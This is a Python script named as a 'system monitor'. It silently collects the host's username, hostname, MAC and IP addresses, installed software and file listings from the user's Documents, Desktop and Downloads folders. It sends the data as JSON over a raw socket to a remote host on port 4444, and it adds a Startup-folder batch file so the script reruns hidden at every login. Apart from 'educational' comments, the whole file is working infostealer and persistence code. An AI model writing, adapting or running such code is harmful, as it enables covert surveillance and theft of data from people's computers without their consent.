#!/usr/bin/env python3

import os
import sys
import socket
import platform
import getpass
import requests
import json
import subprocess
import time
from datetime import datetime
import logging
from urllib.request import urlopen
import uuid
import shutil

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filename='system_info.log'
)

class SystemMonitor:
    def __init__(self, remote_host="localhost", remote_port=4444):
        self.system_info = {}
        self.remote_host = remote_host
        self.remote_port = remote_port
        
    def gather_system_info(self):
        """Gather system information"""
        try:
            self.system_info = {
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "hostname": socket.gethostname(),
                "os": platform.system(),
                "os_release": platform.release(),
                "architecture": platform.machine(),
                "processor": platform.processor(),
                "username": getpass.getuser(),
                "mac_address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                                       for elements in range(0,8*6,8)][::-1]),
                "drives": self.get_drive_info(),
                "network": self.get_network_info(),
                "installed_software": self.get_installed_software(),
                "user_files": self.get_user_files()
            }
            logging.info("System information gathered successfully")
        except Exception as e:
            logging.error(f"Error gathering system info: {str(e)}")

    def get_drive_info(self):
        """Get information about system drives"""
        drives = []
        try:
            if platform.system() == "Windows":
                # Get Windows drive information
                output = subprocess.check_output("wmic logicaldisk get caption", shell=True).decode()
                drive_letters = [line.strip() for line in output.splitlines() if line.strip() 
                               and "Caption" not in line]
                for drive in drive_letters:
                    try:
                        total, used, free = self.get_drive_space(drive)
                        drives.append({
                            "drive": drive,
                            "total_space": total,
                            "used_space": used,
                            "free_space": free
                        })
                    except:
                        continue
        except Exception as e:
            logging.error(f"Error getting drive info: {str(e)}")
        return drives

    def get_drive_space(self, drive):
        """Get space information for a specific drive"""
        try:
            total, used, free = shutil.disk_usage(drive)
            return (
                f"{total // (2**30)} GB",
                f"{used // (2**30)} GB",
                f"{free // (2**30)} GB"
            )
        except:
            return ("N/A", "N/A", "N/A")

    def get_network_info(self):
        """Get network configuration"""
        network_info = {}
        try:
            # Get IP address
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            network_info["ip_address"] = s.getsockname()[0]
            s.close()

            # Get public IP
            try:
                network_info["public_ip"] = urlopen('https://api.ipify.org').read().decode('utf8')
            except:
                network_info["public_ip"] = "Unable to determine"

            # Get default gateway
            if platform.system() == "Windows":
                output = subprocess.check_output("ipconfig", shell=True).decode()
                for line in output.split('\n'):
                    if "Default Gateway" in line:
                        gateway = line.split(":")[-1].strip()
                        if gateway and gateway != "":
                            network_info["default_gateway"] = gateway
                            break

        except Exception as e:
            logging.error(f"Error getting network info: {str(e)}")
            network_info["error"] = str(e)
        
        return network_info

    def get_installed_software(self):
        """Get list of installed software"""
        software_list = []
        try:
            if platform.system() == "Windows":
                cmd = 'powershell "Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion"'
                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
                for line in proc.stdout:
                    try:
                        decoded = line.decode().strip()
                        if decoded and "DisplayName" not in decoded:
                            software_list.append(decoded)
                    except:
                        continue
        except Exception as e:
            logging.error(f"Error getting software list: {str(e)}")
        return software_list[:20]  # Limit to first 20 items

    def get_user_files(self):
        """Get list of user files"""
        user_files = []
        try:
            user_profile = os.environ.get('USERPROFILE')
            important_dirs = ['Documents', 'Desktop', 'Downloads']
            
            for dir_name in important_dirs:
                dir_path = os.path.join(user_profile, dir_name)
                if os.path.exists(dir_path):
                    files = os.listdir(dir_path)
                    user_files.extend([{
                        "directory": dir_name,
                        "file": file,
                        "size": os.path.getsize(os.path.join(dir_path, file)) // 1024  # Size in KB
                    } for file in files[:10]])  # Limit to first 10 files per directory
        except Exception as e:
            logging.error(f"Error getting user files: {str(e)}")
        return user_files

    def send_info(self):
        """Send gathered information to remote server"""
        try:
            # Create a socket connection to the server
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((self.remote_host, self.remote_port))
            
            # Send the data
            data = json.dumps(self.system_info).encode()
            client.send(data)
            
            logging.info(f"Information sent to {self.remote_host}:{self.remote_port}")
            
            # Close the connection
            client.close()
                
        except Exception as e:
            logging.error(f"Error sending information: {str(e)}")
            # Save locally if can't send
            with open('system_info.json', 'w') as f:
                json.dump(self.system_info, f, indent=4)

def create_startup_script():
    """Create a script to run on system startup - For educational purposes only"""
    try:
        if platform.system() == "Windows":
            startup_path = os.path.join(
                os.getenv('APPDATA'),
                'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
            )
            script_path = os.path.join(startup_path, 'system_monitor.bat')
            
            # Create batch file content
            current_dir = os.path.dirname(os.path.abspath(__file__))
            batch_content = f'''@echo off
start /MIN pythonw "{current_dir}\\usb_monitor.py"
'''
            
            # Write batch file
            with open(script_path, 'w') as f:
                f.write(batch_content)
            
            logging.info(f"Startup script created at {script_path}")
            
    except Exception as e:
        logging.error(f"Error creating startup script: {str(e)}")

def main():
    try:
        # Create monitor instance
        monitor = SystemMonitor()
        
        # Gather system information
        monitor.gather_system_info()
        
        # Send information
        monitor.send_info()
        
        # Create startup script (educational demonstration)
        create_startup_script()
        
        logging.info("Monitoring completed successfully")
        
    except Exception as e:
        logging.error(f"Error in main execution: {str(e)}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nMonitoring terminated by user")
        sys.exit(0)
    except Exception as e:
        logging.error(f"Unexpected error: {str(e)}")
        sys.exit(1)
